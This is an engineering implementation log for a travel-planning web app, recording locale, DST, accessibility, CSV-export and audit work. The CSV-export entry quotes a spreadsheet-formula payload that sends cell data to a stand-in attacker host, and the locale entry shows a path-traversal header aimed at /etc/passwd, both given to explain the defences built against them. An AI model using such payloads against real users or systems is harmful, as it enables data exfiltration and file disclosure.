# JourneyLab — Implementation Log

| Field | Value |
| --- | --- |
| Owner | Implementing engineer per entry |
| Status | `READY` — **no entries yet; no implementation has occurred** |
| Cadence | One entry per sub-step, written in the same commit as the work |
| Last reviewed | 2026-08-05 |

Navigation: [Logs index](README.md) · [Bug register](BUG_REGISTER.md) · [Regression log](REGRESSION_LOG.md) · [Sub-step protocol](../02-delivery/SUB_STEP_PROTOCOL.md)

---

## Entry format

```markdown
## IMPL-NNN — STEP-NNN.MM — [Sub-step title]

| Field | Value |
| --- | --- |
| Date | YYYY-MM-DD |
| Author | |
| Requirements | REQ-… |
| Blast radius | BR-NNN (LOW/MEDIUM/HIGH/CRITICAL) |
| Commit | `<sha>` |
| Graph indexed commit | `<sha>` — matched HEAD? yes/no |

### What was built
Concrete description of the delivered behavior.

### Why this approach
The options considered and why this one. **If an obvious simpler approach was
rejected, say why** — this is the field future readers actually need.

### Decisions taken during implementation
| Decision | Alternatives | Rationale | Promoted to ADR? |
| --- | --- | --- | --- |

### Deviations from the step file
What differed from the plan, and why. If none, say "none".

### What surprised us
Anything that behaved differently from expectation. This is where the
expensive knowledge lives.

### Follow-up created
| Item | Type | ID |
| --- | --- | --- |

### Verification
| Check | Result |
| --- | --- |
| Sub-step tests | |
| Regression R1–R7 | see REGRESSION_LOG |
| detect_changes() scope | |
| Documentation updated | |
```

---

## Entries

## IMPL-021 — STEP-003.07 — Locale, time zone, currency and DST handling

| Field | Value |
| --- | --- |
| Date | 2026-08-10 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-NFR-007, REQ-NFR-008 (and REQ-SEC-006 on the negotiation path) |
| Blast radius | [BR-024](blast-radius/BR-024-i18n-locale-timezone-money.md) (MEDIUM, confidence HIGH) |
| Commit | see git log for this entry |
| Graph indexed commit | `bb943f9` — matched HEAD at pre-change |

### What was built
`packages/ui/src/i18n/` — `money.ts`, `datetime.ts`, `messages.ts`; `apps/web/src/lib/i18n.ts` and `messages/en.ts`; `tests/guards/logical-css.sh`. The root layout now negotiates a locale per request. 36 new tests (256 UI, 61 web).

### DST is a feasibility concern, not a formatting one
The sub-step record said it before the work started, and it shaped everything: *"an itinerary crossing a transition computes wrong travel windows, which STEP-012 will then present as a valid plan."*

A formatting bug shows a wrong string. A DST bug ships a wrong plan — and it ships it looking correct, because the solver will already have declared it feasible.

The night of 2026-03-29 in Europe/London is **23 hours long**. A journey from 22:00 the previous evening to 06:00 the next morning is eight hours on a wall clock and **seven in reality**. A 90-minute connection inside that window is a 30-minute one. `hoursInDay` returns 23, 24 or 25 rather than assuming; `elapsedHours` subtracts instants, which cannot be fooled by a clock that jumped. Both are tested against Europe/London **and** Australia/Sydney, where the transitions are reversed — a suite that only checks Europe encodes a northern-hemisphere assumption it never states.

### Two carried questions, resolved — and they were the same question
`STEP-003.02` left "the ICU message loading strategy interacts with server components" open, and §4 of this sub-step asked whether formatting runs server-side, client-side or both. Both are the hydration problem.

**The decision: every formatter takes `locale` and `timeZone` as required arguments and reads nothing ambient.** The usual mismatch is a server rendering in UTC and a browser re-rendering in its own zone; React reports it, and a user sees the time flicker to a different value. Passing both explicitly makes the two outputs identical by construction.

**The zone comes from the trip, not the reader.** A traveller checking their Tokyo itinerary from London wants Tokyo times. "The ferry leaves at 23:40 yesterday" is true and useless.

**Catalogues are plain data, resolved synchronously, passed in as values.** An async load inside a component makes every component that renders text a suspense boundary. A module-level "current locale" is shared mutable state on a server handling concurrent requests, and the failure mode is one user seeing another user's language — the same hazard `auth/context.py` designed out at STEP-002.02.

### `Accept-Language` is untrusted input
The naive locale loader is `import('./messages/' + locale)`. With `Accept-Language: ../../../../etc/passwd` that is a path traversal. The header is therefore only ever used to **select** from a statically-imported map, and never concatenated into anything; a miss is `undefined`, not a filesystem read. It is length-capped at 512 bytes before parsing, because a 2 MB header with fifty thousand q-weighted tags is a cheap way to spend server CPU on every request.

### Money is an integer count of minor units
`0.1 + 0.2 !== 0.3`, and currency arithmetic is mostly addition. Thirty ten-cent items summed as floats do not equal three euros. The representation is `{ amountMinor, currency }`; only formatting divides. **The exponent is not always 2** — JPY and KRW have none, BHD/KWD/TND have three, and hard-coding `/ 100` shows a Japanese price one hundred times too small.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` (16 guards + lint + typecheck + Python + tests + **build**) | **PASS** — 335 Python + 61 web + 256 UI |
| `pnpm ci:local` (Linux, clean checkout, cold install, `CI=true`) | **PASS** — and it rejected my first BUG-017 fix before it was pushed |
| Host-zone independence | **PASS** under UTC, Pacific/Auckland, America/Los_Angeles, Asia/Kolkata, Europe/London |
| Guard meta-suite | 40/40 |

**Mutation testing — 26 killed, 2 recorded as equivalent, 3 vacuous tests found and fixed.**

| Module | Result |
| --- | --- |
| `datetime.ts` | 6/6 killed — including dropping the second DST correction pass and ignoring the zone entirely |
| `money.ts` | 6 killed, **1 equivalent** (see below) |
| `messages.ts` | 5/5 killed, **after fixing two tests that passed for the wrong reason** |
| `apps/web/src/lib/i18n.ts` | 9 killed, **1 equivalent**; one vacuous test fixed |
| `logical-css.sh` | 5/5 killed, and the documented exemption honoured |

### Three tests that proved nothing, and one comment that was wrong
This is the part worth reading.

**`resolveLocale` — two tests passed for the wrong reason.** `resolveLocale('en-AU', ['fr', 'en'])` expected `'en'`, which is also the default fallback. Deleting the base-language branch entirely still returned `'en'`. The fix is to make the fallback a *different* language from the expected answer.

**The header length cap.** The flood was built from tags like `xx0`, `xx1` — which the shape check discards anyway, so removing the cap still produced `[]`. Rebuilt from well-formed tags, plus an assertion that the same tags *under* the cap are parsed, so the empty result is the cap and not the shape check quietly doing the work.

**My own comment in `parseMoney` was false.** It claimed `Math.round(1.005 * 100)` mis-parses to 100 minor units. That is true of the expression and irrelevant here: `1.005` has three decimals, so for EUR it is **rejected by the precision check before any multiplication**. I scanned every two-decimal value from 0.01 upward and magnitudes past `Number.MAX_SAFE_INTEGER` and found no accepted input where the two routes disagree. The mutant is recorded as **equivalent** rather than papered over with a contrived test, and the comment now says so. The string implementation stays because it is exact by construction rather than exact by empirical accident.

**A `?? {}` that could never be reached.** A missing catalogue would have rendered a page of raw message keys with no error anywhere — and the branch was unreachable, so it could not be tested either. Replaced with a load-time invariant that throws if the fallback locale has no catalogue, proven by renaming the catalogue key and watching the error appear. Same shape as the unreachable fail-closed branch found in `redaction.py` at STEP-002.07.

### A runtime check TypeScript could not give me
The first version of the "no ambient zone" test asserted that `formatDateTime` throws without a `timeZone`. **It did not throw.** `Intl.DateTimeFormat` treats `timeZone: undefined` as "use the system zone", so the failure was not an exception — it was a server silently rendering in whatever zone the container happened to have. TypeScript makes the argument required and that is worthless at the package boundary, where JavaScript consumers, `any` from a fetch, and optional fields two layers up all arrive as `undefined`. `assertZone` now rejects an absent zone **and** a misspelled one, because `Europe/Londn` must never quietly become the system default.

### The performance cost, stated rather than hidden
`headers()` in the root layout opts every route out of static rendering — the build output now marks all seven routes `ƒ (Dynamic)`. That is free today, because the only page is already `force-dynamic` for session cookies, and it stops being free when STEP-007 adds cacheable pages. The migration is a `/[locale]/` path segment, and it is written into `layout.tsx` rather than left to be rediscovered.

### RTL is enforced at the source, not tested at the surface
Physical properties (`left`, `margin-left`) and logical ones (`inset-inline-start`, `margin-inline-start`) render **identically** in the LTR locale everyone develops in. No unit test catches the difference; it appears only in a language nobody on the team reads. So `tests/guards/logical-css.sh` fails the build on any physical directional property, with a same-line `rtl-exempt: <reason>` escape hatch that is reviewable because it must state why.

### A pre-existing broken production build — BUG-017
`pnpm --filter @journeylab/web build` failed at `bb943f9`, before any change here. Confirmed by stashing the working tree and rebuilding at HEAD: identical failure. Next's own type-check step loads the TypeScript **compiler API**, which TypeScript 7 (ADR-009) does not ship, so Next decides TypeScript is missing, "installs" it, and then crashes with an error naming nothing that is actually wrong.

Nothing in `pnpm verify` or CI ran `next build`, which is why it sat undetected.

**My first fix was wrong, and the CI mirror is the only reason that is known.** `ignoreBuildErrors: true` made the build pass locally, so I committed it. `pnpm ci:local` failed on the next run: that flag does not gate the probe, it only decides whether the *result* is enforced. Locally the auto-install branch stumbled through; under `CI=true` the same probe aborts with the single word `Failed`. One defect, two symptoms, and only one visible where I was looking.

The real fix is `@typescript/native-preview` as a pinned **marker** devDependency — Next 16 has an explicit branch that skips its check when that package resolves. Nothing imports it, and `tsc` still resolves to 7.0.2 (native-preview's binary is `tsgo`). `ignoreBuildErrors` stays, for an unobvious reason: without it the build prints *"Running TypeScript … Finished TypeScript in 75ms"* having checked nothing, and a green message for work that did not happen is worse than an honest "Skipping validation of types".

`pnpm build` is now part of `verify`, which protects its own fix: remove the marker and `verify` fails.

### What is NOT met
**RTL implementation** — explicitly Phase 2, and out of scope by the sub-step's own boundary. What is delivered is the precondition: logical properties everywhere, enforced.

**Translation content** — also out of scope. One catalogue ships, and the machinery around it is the deliverable.

**Real-browser RTL rendering.** The RTL test asserts structure in jsdom, which does not lay anything out. Binds at STEP-003.08 with the other browser-dependent checks.

### Follow-ups
| Item | Owner step |
| --- | --- |
| `/[locale]/` routing to restore static rendering | STEP-007 |
| Real-browser RTL and touch-target verification | STEP-003.08 |
| Cross-package impact is invisible to the graph (`workspace:*` not followed) | STEP-026 |
| Trip-supplied time zone replacing the UTC default | STEP-009 |

---

## IMPL-020 — STEP-003.06 — Role-aware desktop and mobile navigation

| Field | Value |
| --- | --- |
| Date | 2026-08-10 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-SEC-004 |
| Blast radius | [BR-023](blast-radius/BR-023-navigation.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `94bf916` — matched HEAD at pre-change |

### What was built
`packages/ui/src/nav/` — `navigation.tsx` and a **generated** `authz-matrix.ts`; `tools/gen_authz_matrix_ts.py`; navigation wired into the shell header. 21 tests (220 in the package).

### ADR-012's review trigger fired, and its prediction held
That ADR said the frontend would eventually need the matrix in TypeScript, that it must be **generated from the same markdown**, and that the shared parser made a second emitter additive. All three were correct: `gen_authz_matrix_ts.py` reuses `parse_matrix()` unchanged and the Python emitter was not touched.

Two hand-maintained copies of an authorization matrix diverge, and the divergence is silent — the menu starts offering something the server refuses, or hiding something it permits, and neither is visible from either file alone.

### Why the security tests matter more than the rendering ones
The sub-step says it plainly: *"a hidden nav item with an open endpoint is a vulnerability, not a UI bug."* So the tests establish two separate things:

1. **Hiding matches the server** — every operation × every role, not a sample.
2. **Hiding is not relied upon, and cannot become a control by accident.** The function is `visibleItems`, not `permittedItems`. A test asserts it contains no `fetch`, `redirect` or `throw`, that the `href` survives filtering, and that the module says so in plain words.

The last of those looks like testing a comment, and is deliberate. The comment is the only thing standing between a future reader and the assumption that the menu protects the route.

### Other decisions
**`aria-current="page"`, and the CSS styles from that attribute** rather than a separate class. One source, so the visual state cannot say something different from what a screen reader announces.

**44×44 touch targets**, not the 24×24 that WCAG 2.2 AA requires. The difference between technically-compliant and usable with a thumb on a moving train — which is where a traveller uses this.

**Role hard-coded to `guest`** in the shell until the session provider lands. Guest sees the least, so the placeholder cannot accidentally reveal an item.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 220 UI |
| Live render | `<nav aria-label="Main navigation">`; guest sees no `/admin/` links; zero errors |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** role filtering removed, `aria-current` dropped, drawer focus trap removed, `aria-expanded` hard-coded, and an unknown pairing shown instead of hidden.

### What is NOT met
**"Directly requesting a hidden route is denied server-side."** No routes exist — `/admin/*` and `/trips` are not pages, and no endpoint enforces anything until STEP-004. The policy itself is proven at STEP-002.03 across 176 cells, but that is a unit test of the decision function, not a request to a route. Recorded unmet rather than counted as covered by the policy tests.

### Surprises
**Biome's `useValidAriaRole` fired on a React prop named `role`.** It reads `role="guest"` on a component as the HTML ARIA attribute. That is a false positive — but the collision is real for human readers too, so the prop became `actorRole` rather than adding a suppression. Given I had just added two suppressions that suppressed nothing, biasing away from them was the right instinct.

**The blanket rename then caught a loop variable of the same name**, breaking two assertions. A regex rename is not a refactor; typecheck caught it immediately.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Server-denial test against real routes | STEP-004 |
| Touch-target and breakpoint verification in a browser | STEP-003.08 |
| Session provider to replace the hard-coded `guest` | STEP-004 |

---

## IMPL-019 — STEP-003.05 — Application frame, providers and global error boundary

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-NFR-013 |
| Blast radius | [BR-022](blast-radius/BR-022-app-shell.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `b09a0a2` — matched HEAD at pre-change |

### What was built
`packages/ui/src/shell/` (error boundaries, skip link, locale direction) and a real `apps/web` frame replacing the STEP-002.05 scaffold. 20 tests (199 in the package).

### Why this approach
**The unit of error containment is the FEATURE, not the app.** Blueprint §8.114 requires that a map or chart failure not remove itinerary text. A single root boundary satisfies the opposite: it turns one component's failure into a blank page. So `FeatureErrorBoundary` sits *between* siblings, and a test asserts that when the map throws, "Day 1: ferry to the island" and "Day 2: coastal walk" are both still on screen.

**The error message is never rendered.** An `Error.message` can carry a URL, a stack frame or a provider response. A test throws `ECONNREFUSED https://provider.internal/key=abc123` and asserts neither the host nor the key reaches the DOM; the detail goes to `onError` for reporting.

**Feature boundaries do not use `role="alert"`; the global one does.** Interrupting the user is wrong when the point of containment is that the rest of the page still works — and right when there is nothing left to interrupt.

**Provider order is documented because the sub-step flagged it.** Outermost-in: global boundary → locale → session → query/data. The rule that falls out is worth stating plainly: **nothing that fetches sits above the session.** A client cache keyed without a session can serve one tenant's data to another — the client-side form of the hazard `REQ-SEC-002` names for server caches.

**`lang` and `dir` are derived together.** A mismatched pair (`lang="ar"` with `dir="ltr"`) is worse than either alone, and that mismatch is exactly what a hand-maintained setting drifts into.

**The skip link is first in the document and its target carries `tabIndex={-1}`.** Browsers differ on whether `href="#id"` moves focus or only scrolls; without the target being programmatically focusable, the link scrolls and leaves focus where it was — looking like it worked.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 199 UI |
| Live render against the dev server | Three landmarks; **skip link first focusable in body**; `lang="en" dir="ltr"`; zero errors |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** boundary re-throwing instead of containing, error message rendered to the user, feature boundary using `role="alert"`, recovery performed automatically, and direction hard-coded to LTR.

### What is NOT met
**CWV budgets.** `FRONTEND_ARCHITECTURE` §7 sets LCP ≤ 2.5 s, INP ≤ 200 ms, CLS ≤ 0.1. None is measurable in jsdom — they need a real browser and Lighthouse, which arrive at STEP-003.08. The shell is small and static and *likely* passes; likely is not measured, so the criterion is recorded unmet.

### Two architectural problems this surfaced
**`.ts`/`.tsx` import specifiers made the package unusable.** They require every *consumer* to enable `allowImportingTsExtensions`; `apps/web` does not, and Next's bundler rejects them outright. Every relative import in `packages/ui` is now extensionless.

**Seven modules needed `'use client'`.** Anything using hooks or class lifecycle cannot render on the server. Neither problem was visible while `packages/ui` was only consumed by its own tests — they appeared the moment a real application imported it.

### Surprises
**A dead suppression comment again.** Biome reported a `biome-ignore` in `providers.tsx` for a rule that never fires — the second in two sub-steps. That is a pattern in my own work, not bad luck: I am adding them pre-emptively rather than in response to a rule that actually fires, and each one teaches the next reader that a constraint exists where it does not.

**The same JSX syntax error twice.** Placing a comment beside the root element of a `return` is invalid, and I did it in `.04` and again here. Rationale belongs in the doc comment.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Measure CWV against §7 budgets | STEP-003.08 |
| Locale, session and query providers | STEP-003.07, STEP-004 |
| Error reporting sink for `onError` | STEP-024 |
| Skip-link visibility on focus in a real browser | STEP-003.08 |

---

## IMPL-018 — STEP-003.04 — Table, list and CSV export

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-002 (also REQ-A11Y-003) |
| Blast radius | [BR-021](blast-radius/BR-021-table-list-csv.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `c358d4b` — matched HEAD at pre-change |

### What was built
`packages/ui/src/data/` — `table.tsx` (DataTable, DataList) and `csv.ts`. 27 tests (179 in the package).

### Why this approach
**Virtualisation must not lie about size.** Rendering 20 of 10,000 rows is how a table stays fast, and it is also how a screen reader comes to announce "row 3 of 20" — telling the user the dataset is 500 times smaller than it is, with no way to discover otherwise. `aria-rowcount` on the table and `aria-rowindex` on each row carry the true totals independently of the DOM, so a virtualised row 4,001 announces itself as 4,001. Both are computed from the full set; the window is a rendering concern only.

**No virtualisation library was adopted.** The sub-step warns that they "frequently break AT row counts", so `virtualWindow` is a plain prop: the caller picks the slice, the component keeps the ARIA contract correct regardless. Any library adopted later must pass these tests, which now exist first.

**CSV export is a security surface, not a formatting convenience.** A cell starting `=`, `+`, `-`, `@`, tab or CR is executed as a formula by Excel, LibreOffice and Sheets. A trip note reading `=HYPERLINK("https://evil.example/?d="&A1,"Click me")` exfiltrates the adjacent cell when a colleague opens the shared file. The attacker never touches our servers — they type into a field we faithfully export.

Our data makes this worse than average: briefs and comments are free text, and exports are meant to be shared. Dangerous cells are prefixed with `'`, which spreadsheets render as literal text — the value survives, the execution does not.

**Export uses the full sorted set, never the rendered window.** Exporting what happens to be on screen hands the user a silently truncated file. Asserted with a 500-row dataset and a 10-row window.

**`aria-sort` on the sorted column only.** Setting `"none"` on every other header is noise a screen reader announces on each cell.

**The list keeps every header attached to its value** via a definition list. A responsive table that drops headers on small screens conveys strictly less than the wide one, which `REQ-A11Y-002` does not permit.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 179 UI |
| axe, WCAG 2.2 AA | Zero violations: table, list, empty table, virtualised table |
| Guard meta-suite | 36/36 |

**Mutation testing — 6/6 killed:** `aria-rowcount` reporting the window, `aria-rowindex` restarting per window, the formula-injection defence removed, export truncated to the window, `scope` dropped from headers, and `aria-sort="none"` on every column.

### Surprises
**A suppression comment that suppressed nothing.** Biome reported that my `biome-ignore` in `dialog.tsx` had no effect — the rule never fired there. Removed rather than left in place: a suppression claiming a rule applies where it does not teaches the next reader to trust a constraint that is not there.

**Biome preferred `<section>` to `role="region"`**, and was right — a native element carries the role implicitly and cannot lose it to a typo. Fixing it, I put a JSX comment before the root element of a `return` and broke the parse; the rationale moved to the doc comment where it belongs.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Real windowing (measurement, scroll sync) | STEP-011, first large dataset |
| Arrow-key grid navigation, if a dataset needs it | Deferred — a native table is already navigable by screen-reader table commands |
| Verify any virtualisation library against these row-count tests | Before adopting one |

---

## IMPL-017 — STEP-003.03 — Feedback primitives: dialog, notification, empty, error, skeleton

| Field | Value |
| --- | --- |
| Date | 2026-08-07 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001, REQ-A11Y-004 (also REQ-EVID-005, REQ-CONS-005, REQ-NFR-003) |
| Blast radius | [BR-020](blast-radius/BR-020-feedback-primitives.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `b28bf15` — matched HEAD at pre-change |

### What was built
`packages/ui/src/feedback/` — 45 tests (152 in the package).

| File | Role |
| --- | --- |
| `states.ts` | The nine mandatory states as data, with icon, label and politeness |
| `dialog.tsx` | Focus trap, restoration, Escape |
| `panels.tsx` | One component per state, plus `Progress` |
| `notification.tsx` | Toast with required politeness; always-mounted regions |

### Why this approach
**The nine states are data, so "all nine" is checkable.** FRONTEND_ARCHITECTURE §4 mandates a specific list and the acceptance criterion says all nine must exist. A list in a comment cannot be verified; a test compares the declared set against the required one.

**Three requirements are enforced by making the wrong thing unconstructible**, rather than discouraged in a style guide nobody re-reads:

- `Progress` requires both a `label` and an `onCancel`. `REQ-NFR-003` forbids a silent spinner — so a bare spinner cannot be built.
- `InfeasibleState` **throws** on an empty conflict set. `REQ-CONS-005` requires a minimal conflict set, never a bare failure; an empty panel would be the uninformative dead end the requirement exists to prevent.
- `StaleDataState` requires `subject` and `observedAt`. `REQ-EVID-005` wants staleness at the point of use, so this component cannot be rendered as a page-level "some data may be out of date" — there is no way to construct it without naming the thing and the time.

**Assertive politeness is rationed.** Only `infeasible`, `unauthorized` and `offline` interrupt. Interrupting someone mid-sentence is justified only when what they are reading is wrong; everything else waits for a pause. A test pins that exact set, so widening it is a deliberate act.

**`UnauthorizedState` offers no retry and names nothing.** Retrying cannot grant permission, and offering it implies it might. More importantly, STEP-002.02 made denial and absence indistinguishable at the API — a panel saying "you lack permission for trip 4821" would undo that at the last hop. A test asserts the text leaks none of *forbidden*, *permission*, *not found*, *exists*, *tenant*.

**Notifications never auto-dismiss.** WCAG 2.2.1 requires time limits to be adjustable; a toast that vanishes on a timer is unreadable to anyone using a screen reader, magnification, or simply reading slowly. Both live regions are mounted before any message exists, because a region created when content arrives is frequently never announced.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 152 UI |
| axe, WCAG 2.2 AA tags | Zero violations on all ten primitives plus the dialog |
| Guard meta-suite | 36/36 |

**Mutation testing — 6/6 killed:** focus never restored, focus trap removed, Escape disabled, infeasible accepting an empty conflict set, a quality state dropped, and progress losing its cancel control.

### The bug worth recording
**The focus trap was silently inert.** My visibility filter used `element.offsetParent !== null`. jsdom computes no layout, so that is *always* null — the filter returned an empty list and the trap did nothing. Three tests failed immediately.

It would also have been wrong in a real browser: `offsetParent` is null for `position: fixed` elements, which is what a dialog usually is. So the jsdom failure exposed a genuine defect rather than an environment quirk. Replaced with checks on `hidden`, `aria-hidden` and `inert`, none of which need layout.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Validate streamed-update politeness with a real screen reader | STEP-003.08 / STEP-011 |
| Icon set behind the `data-icon` names | STEP-003.04 / .05 |
| Feature error boundaries (map/chart failure must not remove itinerary text) | STEP-013 |

---

## IMPL-016 — STEP-003.02 — Form and input primitives with validation states

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-001 |
| Blast radius | [BR-019](blast-radius/BR-019-form-primitives.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `0e3ea40` — matched HEAD at pre-change |

### What was built
`packages/ui/src/form/` — the repository's first components. 39 new tests (107 in the package).

| File | Role |
| --- | --- |
| `field.tsx` | Label, description and error association; the polite live region |
| `inputs.tsx` | TextInput, NumberInput, DateInput, Select, Checkbox, RadioGroup |
| `locale-number.ts` | Separator-aware parsing that refuses ambiguity |
| `zoned-date.ts` | Calendar dates and explicit-zone conversion |

### Why this approach
**Association is centralised so it cannot be forgotten.** Getting label, description and error wiring right once is easy; getting it right on the fourteenth form is not. Every primitive routes through `Field`, so a component author cannot ship an input whose error is invisible to a screen reader.

**Errors are polite, and focus never moves.** `aria-live="polite"`, not `role="alert"` — assertive interrupts the user mid-sentence, which for someone still typing means being cut off about a field they have not finished. And the region is rendered *always*, not inserted when an error appears: a live region created at the moment it gains content is frequently never announced, because the screen reader must already be observing the node.

**`Number.parseFloat` is wrong for user input.** `parseFloat("1.234,56")` returns **1.234** — off by three orders of magnitude, silently. Separators come from `Intl.NumberFormat` per locale, and genuinely ambiguous input like `"1,23"` is **refused** rather than guessed, because guessing is wrong half the time.

**`type="text"` with `inputMode="decimal"`, not `type="number"`.** A native number input silently discards characters the browser dislikes, so a German user typing `1.234,56` can lose part of what they typed with no feedback.

**Dates carry no implicit zone.** `DateInput` hands back a `CalendarDate`, never a `Date`. A `Date` is an instant and a date input's value is not one; attaching the browser's zone is exactly the bug the sub-step warns "becomes an infeasible itinerary in STEP-012". `startOfDayUtc` requires an IANA zone with no default, and probes the offset rather than assuming it, so DST boundaries do not drift an hour.

**Disabled and read-only are kept distinct.** `disabled` removes the control from the tab order, excludes it from submission, and in several screen readers makes it unreadable — the user cannot discover what the field was. `readOnly` keeps it focusable and readable. "You cannot change this right now, but here is its value" is almost always read-only.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 107 UI |
| axe, WCAG 2.2 AA tags | Zero violations on all six primitives |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** live region made assertive, `aria-describedby` dropping the error, label disassociated, read-only implemented as disabled, and `NumberInput` reverted to `type="number"`.

### Biome caught two standards errors I had written
`aria-required` on `input[type=date]` — that input type has **no ARIA role**, so the attribute is unsupported on it. Moving it to a `<fieldset>` for the radio group was no better: a fieldset maps to `role="group"`, which does not support `aria-required` either, and forcing `role="radiogroup"` onto a non-interactive element trades one violation for another.

The correct answer in both cases was to stop reaching for ARIA. The native `required` attribute already maps to the same accessibility property, and per the HTML spec `required` on one radio makes its whole same-named group required. **Reaching for ARIA when HTML already says it is how elements end up over-annotated and less accessible, not more.**

### Surprises
**A mutant appeared to survive, and my harness had mutated a comment.** Flipping `aria-live="polite"` to `assertive` failed nothing — because the first textual occurrence of that string in `field.tsx` is inside the module docstring, not the JSX. Re-run against the actual attribute, two tests failed as they should.

Third time a mutation harness has misled me: once through a `ruff format` reflow, once through an apostrophe terminating a quoted block, now through a docstring. **A mutation that reports "survived" needs its own verification that it applied to code.**

**axe passing first time was itself suspicious**, so before trusting it I proved it fails on an unlabelled input and an image with no alt. Those two proofs are now permanent tests — without them, "zero violations" is indistinguishable from axe not running.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Resolve ICU message loading vs server components | Before STEP-003.07 |
| Real-browser verification (jsdom is not a browser) | STEP-003.08 |
| Assistive-technology testing beyond axe | STEP-003.08 |

---

## IMPL-015 — STEP-003.01 — Design tokens including high-contrast and reduced-motion

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-A11Y-004, REQ-NFR-013 |
| Blast radius | [BR-018](blast-radius/BR-018-design-tokens.md) (MEDIUM) |
| Commit | see git log for this entry |
| Graph indexed commit | `9f5ff36` — matched HEAD at pre-change |

### What was built
`packages/ui/` — the first design-system package. 68 tests.

| File | Role |
| --- | --- |
| `src/tokens.ts` | Source of truth: three palettes, scales, motion, status tokens |
| `src/tokens.css` | **Generated** custom properties with media queries |
| `src/contrast.ts` | WCAG 2.2 relative-luminance and contrast-ratio maths |
| `tools/gen-tokens.ts` | Generator; drift-gated by a test |

### Why this approach
**Accessibility claims are computed, not asserted.** "These colours pass AA" is something someone checked once, in a tool, against values that have since been edited. Every declared foreground/background pairing has its ratio computed from the token values on every test run, so a colour edited below the bar breaks the build.

The contrast maths is itself verified against published values first — black on white is 21:1, `#767676` on white is 4.54:1. If that function were wrong, every other assertion would be meaningless.

**A colour on its own has no contrast**, so foregrounds are declared *alongside* the backgrounds they may appear on. A test then fails on any colour token with no declared pairing, because such a token is unverifiable.

**Non-text UI is held to 3:1, not 4.5:1** — WCAG 2.2 SC 1.4.11. Borders and focus rings would otherwise be over-constrained into ugliness for no accessibility gain.

**High contrast is a distinct palette held to AAA**, not dark mode intensified. A test asserts it differs from the dark palette, because the lazy implementation is to alias them.

**Reduced motion suppresses rather than shortens.** The sub-step called this vestibular safety, not a preference. Every duration is exactly `0ms` and the test asserts `toBe("0ms")` rather than "shorter than default" — a 60ms animation still moves, and movement is what triggers vertigo. A `!important` catch-all also neutralises any component that hard-codes its own duration.

**Both `prefers-contrast` and `forced-colors`.** Windows High Contrast Mode signals only the latter; handling just `prefers-contrast` would strand exactly the users who most need it.

### Verification performed
| Check | Result |
| --- | --- |
| `pnpm verify` | **PASS** — 335 Python + 41 web + 68 UI |
| Typecheck | Both packages, own configs |
| Module boundaries | 25 files |
| Guard meta-suite | 36/36 |

**Mutation testing — 5/5 killed:** secondary text lightened below AA, a status losing its icon, reduced motion shortened to 60ms instead of suppressed, `forced-colors` support dropped, and a font size hard-coded in px.

### The bug worth recording
**The drift test was self-repairing.** `tokens.css` is generated, and the test imports the generator to compare its output against the committed file. But the generator wrote the file at module top level — so importing it *rewrote the very file the test was about to check*. It could never have failed.

Visible only as a stray `wrote src/tokens.css` line in the test output. The write is now guarded behind a direct-invocation check, and a hand-edited `tokens.css` was confirmed to break the suite.

**A test that repairs the thing it verifies proves nothing.** Same family as `BUG-001`'s self-truncating guard and the mutation harness that mutated nothing.

### Follow-ups
| Item | Owner step |
| --- | --- |
| Lint rule forbidding hard-coded values components should take from tokens | STEP-003.02 |
| Real-browser `forced-colors` verification | STEP-003.08 |
| Confirm the chart library honours token theming | Before STEP-013 |

---

## IMPL-014 — STEP-002.07 — Audit event emission and runtime flag primitives

| Field | Value |
| --- | --- |
| Date | 2026-08-06 |
| Author | Deepesh Kumar Gupta |
| Requirements | REQ-SEC-007, REQ-PLAT-012 |
| Blast radius | [BR-017](blast-radius/BR-017-audit-and-flags.md) (**HIGH**) |
| Commit | see git log for this entry |
| Graph indexed commit | `d7d71cf` — matched HEAD at pre-change |

### What was built
Migration 002 (`audit_events`, `feature_flags`) and `services/audit/` — `audit.py`, `redaction.py`, `flags.py`. 29 tests; 335 Python tests total.

This closes the gaps carried since `.03` and `.04`: `provisioning` has been returning `AuditRecord` and `authz` returning `Decision.audit` with nothing to receive them. `impact(AuditRecord)` confirmed it — two consumers, **both tests**.

### Why this approach
**Append-only is a privilege, not a convention.** The sub-step asks that "no update or delete path exists in code". Code can be changed; a privilege cannot be talked around. `journeylab_app` holds INSERT and SELECT on `audit_events` and nothing else, so `UPDATE`, `DELETE` and `TRUNCATE` all return `permission denied` — verified against the live database, not asserted.

**Redaction at emission, never at query time.** Redacting on read means the raw value was already durably stored and every backup, replica and psql session has it. Redacting at emission means it was never written.

